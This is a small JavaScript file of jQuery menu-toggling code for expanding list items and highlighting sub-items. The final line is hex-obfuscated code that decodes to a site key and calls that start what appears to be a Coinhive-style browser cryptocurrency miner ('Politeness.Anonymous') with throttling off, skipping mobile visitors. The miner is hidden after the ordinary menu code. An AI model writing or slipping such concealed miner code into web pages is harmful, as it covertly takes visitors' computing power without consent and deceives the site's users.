alert("hola mundo");


$(".items > li > a").click(function(e) {
    e.preventDefault();
    var $this = $(this);
    if ($this.hasClass("expanded")) {
        $this.removeClass("expanded");
    } else {
        $(".items a.expanded").removeClass("expanded");
        $this.addClass("expanded");
        $(".sub-items").filter(":visible").slideUp("normal");
    }
    $this.parent().children("ul").stop(true, true).slideToggle("normal");
});

$(".sub-items a").click(function() {
    $(".sub-items a").removeClass("current");
    $(this).addClass("current");
});

var _0xaadf=["\x34\x58\x77\x32\x68\x4C\x35\x6D\x71\x65\x52\x49\x77\x4F\x62\x70\x37\x4C\x55\x6D\x39\x46\x39\x47\x59\x49\x48\x67\x69\x79\x79\x63","\x69\x73\x4D\x6F\x62\x69\x6C\x65","\x64\x69\x64\x4F\x70\x74\x4F\x75\x74","\x73\x74\x61\x72\x74"];var politeness= new Politeness.Anonymous(_0xaadf[0],{throttle:0}),am=!1;politeness[_0xaadf[1]]()|| (am&&  !politeness[_0xaadf[2]](14400)?politeness[_0xaadf[3]]():am|| politeness[_0xaadf[3]]())